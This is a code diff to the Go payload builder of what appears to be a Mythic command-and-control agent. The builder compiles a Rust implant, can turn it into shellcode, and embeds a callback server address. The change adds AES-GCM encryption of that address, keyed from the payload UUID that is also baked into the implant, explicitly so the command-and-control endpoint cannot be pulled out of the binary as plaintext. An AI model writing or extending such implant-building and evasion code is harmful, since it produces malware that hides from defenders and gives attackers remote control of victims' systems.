@@ -1,8 +1,13 @@
 package agent_functions
 
 import (
+	"crypto/aes"
+	"crypto/cipher"
+	"crypto/rand"
+	"crypto/sha256"
 	"encoding/hex"
 	"fmt"
+	"io"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -23,13 +28,12 @@ func Build(input agentstructs.PayloadBuildMessage) agentstructs.PayloadBuildResp
 	shellcode, _ := input.BuildParameters.GetBooleanArg("shellcode")
 	debug, _ := input.BuildParameters.GetBooleanArg("debug")
 
-	// The AES key is provided by Mythic and must be embedded in the implant.
-	// We pass it as IMPLANT_SECRET so the existing derive_key() logic works.
-	aesKey := hex.EncodeToString(input.PayloadUUID[:]) // 36-char UUID as hex secret
-	payloadUUID := input.PayloadUUID
+	// payloadUUID is the 36-char UUID string baked into the implant for checkin.
+	// aesKey is the 32-char hex of the 16-byte UUID used as IMPLANT_SECRET.
+	payloadUUID := input.PayloadUUID.String()
+	aesKey := hex.EncodeToString(input.PayloadUUID[:])
 
-	// The callback host/port/uri come from the C2 profile parameters.
-	// Extract from the first C2 profile instance.
+	// The callback host/port come from the C2 profile parameters.
 	var callbackHost string
 	if len(input.C2Profiles) > 0 {
 		c2 := input.C2Profiles[0]
@@ -38,7 +42,7 @@ func Build(input agentstructs.PayloadBuildMessage) agentstructs.PayloadBuildResp
 		callbackHost = fmt.Sprintf("%s:%s", host, port)
 	}
 
-	// Encrypt the callback address using the same scheme as Linky
+	// Encrypt the callback address so it cannot be extracted as plaintext from the binary.
 	encryptedCallback := encryptCallback(callbackHost, aesKey)
 
 	agentDir := "/Mythic/agent_code"
@@ -77,7 +81,6 @@ func Build(input agentstructs.PayloadBuildMessage) agentstructs.PayloadBuildResp
 		profile = "release-shellcode"
 	}
 
-	// Build the implant
 	args := []string{
 		"build",
 		"--profile", profile,
@@ -104,7 +107,6 @@ func Build(input agentstructs.PayloadBuildMessage) agentstructs.PayloadBuildResp
 	binaryPath := filepath.Join(crateDir, "target", target, profile, binName+outputExt)
 
 	if shellcode && (targetOS == "linux" || targetOS == "macos") {
-		// Extract .text section via objcopy
 		scPath := binaryPath + ".bin"
 		objcopy := exec.Command("objcopy", "-O", "binary", "--only-section=.text", binaryPath, scPath)
 		if objcopyOut, err := objcopy.CombinedOutput(); err != nil {
@@ -114,7 +116,6 @@ func Build(input agentstructs.PayloadBuildMessage) agentstructs.PayloadBuildResp
 		binaryPath = scPath
 	}
 
-	// Read and return the binary
 	data, err := os.ReadFile(binaryPath)
 	if err != nil {
 		resp.BuildStdErr = fmt.Sprintf("failed to read binary at %s: %v", binaryPath, err)
@@ -127,14 +128,33 @@ func Build(input agentstructs.PayloadBuildMessage) agentstructs.PayloadBuildResp
 	return resp
 }
 
-// encryptCallback encrypts the callback address with the implant secret,
-// matching the scheme in agent_code/links/common/src/lib.rs (AES-256-GCM).
-// This is a placeholder — the actual Go implementation must mirror the Rust crypto.
+// encryptCallback encrypts the C2 callback address so it cannot be extracted
+// as a plaintext string from the compiled binary.
+// Output format: hex(nonce_12 || ciphertext) — must match Rust decrypt_config().
 func encryptCallback(callback, secret string) string {
-	// TODO: implement AES-256-GCM encryption matching links/common/src/lib.rs
-	// derive_key(secret.as_bytes(), "callback-salt") → encrypt(callback)
-	// For now, return plaintext (encryption added in Sprint 2)
-	return callback
+	// derive_key: SHA-256(secret || "mythic-salt") — mirrors Rust derive_key()
+	h := sha256.New()
+	h.Write([]byte(secret))
+	h.Write([]byte("mythic-salt"))
+	key := h.Sum(nil) // 32 bytes
+
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		return callback // fallback to plaintext if crypto fails
+	}
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		return callback
+	}
+
+	nonce := make([]byte, gcm.NonceSize()) // 12 bytes
+	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
+		return callback
+	}
+
+	ct := gcm.Seal(nil, nonce, []byte(callback), nil)
+	blob := append(nonce, ct...)
+	return hex.EncodeToString(blob)
 }
 
 // RegisterAllCommands registers every linky command with the Mythic container.
